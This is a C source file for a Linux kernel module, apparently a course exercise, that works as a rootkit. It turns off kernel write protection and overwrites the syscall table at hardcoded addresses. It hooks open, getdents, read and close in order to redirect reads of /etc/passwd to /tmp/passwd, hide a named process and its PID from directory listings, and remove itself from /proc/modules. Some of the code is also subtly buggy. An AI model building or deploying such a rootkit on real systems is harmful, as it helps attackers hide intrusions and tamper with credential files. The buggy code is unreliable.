#include <linux/module.h>      // for all modules 
#include <linux/init.h>        // for entry/exit macros 
#include <linux/kernel.h>      // for printk and other kernel bits 
#include <asm/current.h>       // process information
#include <linux/sched.h>
#include <linux/highmem.h>     // for changing page permissions
#include <asm/unistd.h>        // for system call constants
#include <linux/kallsyms.h>
#include <asm/page.h>
#include <asm/cacheflush.h>

//Macros for kernel functions to alter Control Register 0 (CR0)
//This CPU has the 0-bit of CR0 set to 1: protected mode is enabled.
//Bit 0 is the WP-bit (write protection). We want to flip this to 0
//so that we can change the read/write permissions of kernel pages.
#define read_cr0() (native_read_cr0())
#define write_cr0(x) (native_write_cr0(x))
#define BUFFLEN 256

struct linux_dirent {
	u64            d_ino;
	s64            d_off;
	unsigned short d_reclen;
	char           d_name[BUFFLEN];
};

static int file_d = -1;

static int process_id = 0;
MODULE_LICENSE("GPL");
module_param(process_id, int, S_IRUSR | S_IWUSR | S_IRGRP | S_IROTH);
MODULE_PARM_DESC(process_id, "Sneaky process PID");

//These are function pointers to the system calls that change page
//permissions for the given address (page) to read-only or read-write.
//Grep for "set_pages_ro" and "set_pages_rw" in:
//      /boot/System.map-`$(uname -r)`
//      e.g. /boot/System.map-4.4.0-116-generic
void (*pages_rw)(struct page *page, int numpages) = (void *)0xffffffff81072040;
void (*pages_ro)(struct page *page, int numpages) = (void *)0xffffffff81071fc0;

//This is a pointer to the system call table in memory
//Defined in /usr/src/linux-source-3.13.0/arch/x86/include/asm/syscall.h
//We're getting its adddress from the System.map file (see above).
static unsigned long *sys_call_table = (unsigned long*)0xffffffff81a00200;

//Function pointer will be used to save address of original 'open' syscall.
//The asmlinkage keyword is a GCC #define that indicates this function
//should expect ti find its arguments on the stack (not in registers).
//This is used for all system calls.
asmlinkage int (*original_call)(const char *pathname, int flags, mode_t mode);

asmlinkage int (*original_getdents)(unsigned int fd, struct linux_dirent *dirp, unsigned int count);

//new system call
asmlinkage int (*original_getdents)(unsigned int fd, struct linux_dirent *dirp, unsigned int count);

asmlinkage ssize_t (*original_read)(int fd, void *buf, size_t count);

asmlinkage int (*original_close)(int fd);


//Define our new sneaky version of the 'open' syscall
asmlinkage int sneaky_sys_open(const char *pathname, int flags, mode_t mode) {
	if(strcmp(pathname, "/etc/passwd") == 0) {
		const char * temp_path = "/tmp/passwd";
		if(copy_to_user(pathname, temp_path, sizeof(temp_path))) {
			int ret = EAGAIN;
			return original_call(pathname, flags, mode);
		} else {
			return original_call(pathname, flags, mode);
		}
	} else {
		if(strcmp(pathname, "/proc/modules") == 0) {
			return (file_d = original_call(pathname, flags, mode));
		}
		else {
			return original_call(pathname, flags, mode);
		}
	}
	//printk(KERN_INFO "Very, very Sneaky!\n");
	//return original_call(pathname, flags, mode);
}

asmlinkage int sneaky_sys_close(int fd){
	if (file_d == fd) {
		file_d = -1;
	}
	return original_close(fd);
}

asmlinkage int sneaky_sys_getdents(unsigned int fd, struct linux_dirent *dirp, unsigned int count) {
	int ret, cur;
	struct linux_dirent *d;
	char d_type;
	char temp_pid[128];
	ret = original_getdents(fd, dirp, count);
	d = (struct linux_dirent *)((char *)dirp);
	snprintf(temp_pid, sizeof(temp_pid), "%d", process_id);
	//begin filter
	for(cur = 0; cur < ret; cur += ((int)(d -> d_reclen))) {
		d = (struct linux_dirent *) ((char *)dirp + cur);
		d_type = *((char *) dirp + cur + d -> d_reclen - 1);
		if(((d_type == DT_REG) && (strcmp(d->d_name, "sneaky_process") == 0)) || ((d_type == DT_DIR) && (strcmp(d -> d_name, temp_pid) == 0))) {
			memcpy(d, (char *)d + d -> d_reclen, ret - (int)((((char *)d) + d -> d_reclen) - (char *) dirp));
			ret -= (int)d -> d_reclen;
		}
	}
	return ret;
}

asmlinkage int sneaky_sys_read(int fd, void *buf, size_t count) {
	ssize_t ret = original_read(fd, buf, count);
	int size = 0;
	if(file_d >= 0 && file_d == fd) {
		char * begin = strstr(buf, "sneaky_mod");
		if(begin != NULL) {
			char * next = begin;
			while((*next) != '\n') {
				next++;
			}
			size = next + 1 - begin;
			memmove(begin, next + 1, (ret - ((next + 1) - (char *)buf)));
		}
		return ( ret = ret - size);
	}
	return ret;
}


//The code that gets executed when the module is loaded
static int initialize_sneaky_module(void) 
{
	struct page *page_ptr;

	//See /var/log/syslog for kernel print output
	printk(KERN_INFO "Sneaky module being loaded.\n");

	//Turn off write protection mode
	write_cr0(read_cr0() & (~0x10000));
	//Get a pointer to the virtual page containing the address
	//of the system call table in the kernel.
	page_ptr = virt_to_page(&sys_call_table);
	//Make this page read-write accessible
	pages_rw(page_ptr, 1);

	//This is the magic! Save away the original 'open' system call
	//function address. Then overwrite its address in the system call
	//table with the function address of our new code.
	original_call = (void*)*(sys_call_table + __NR_open);
	*(sys_call_table + __NR_open) = (unsigned long)sneaky_sys_open;

	original_getdents = (void*)*(sys_call_table + __NR_getdents);
	*(sys_call_table + __NR_getdents) = (unsigned long)sneaky_sys_getdents;

	original_read = (void*)*(sys_call_table + __NR_read);
	*(sys_call_table + __NR_read) = (unsigned long)sneaky_sys_read;

	original_close = (void*)*(sys_call_table + __NR_close);
	*(sys_call_table + __NR_close) = (unsigned long)sneaky_sys_close;
	//Revert page to read-only
	pages_ro(page_ptr, 1);
	//Turn write protection mode back on
	write_cr0(read_cr0() | 0x10000);

	return 0;       // to show a successful load 
}  


static void exit_sneaky_module(void) 
{
	struct page *page_ptr;

	printk(KERN_INFO "Sneaky module being unloaded.\n"); 

	//Turn off write protection mode
	write_cr0(read_cr0() & (~0x10000));

	//Get a pointer to the virtual page containing the address
	//of the system call table in the kernel.
	page_ptr = virt_to_page(&sys_call_table);
	//Make this page read-write accessible
	pages_rw(page_ptr, 1);

	//This is more magic! Restore the original 'open' system call
	//function address. Will look like malicious code was never there!
	*(sys_call_table + __NR_open) = (unsigned long)original_call;
	*(sys_call_table + __NR_getdents) = (unsigned long)original_getdents;
	*(sys_call_table + __NR_read) = (unsigned long)original_read;
	*(sys_call_table + __NR_close) = (unsigned long)original_close;
	
	//Revert page to read-only
	pages_ro(page_ptr, 1);
	//Turn write protection mode back on
	write_cr0(read_cr0() | 0x10000);
}  


module_init(initialize_sneaky_module);  // what's called upon loading 
module_exit(exit_sneaky_module);        // what's called upon unloading  


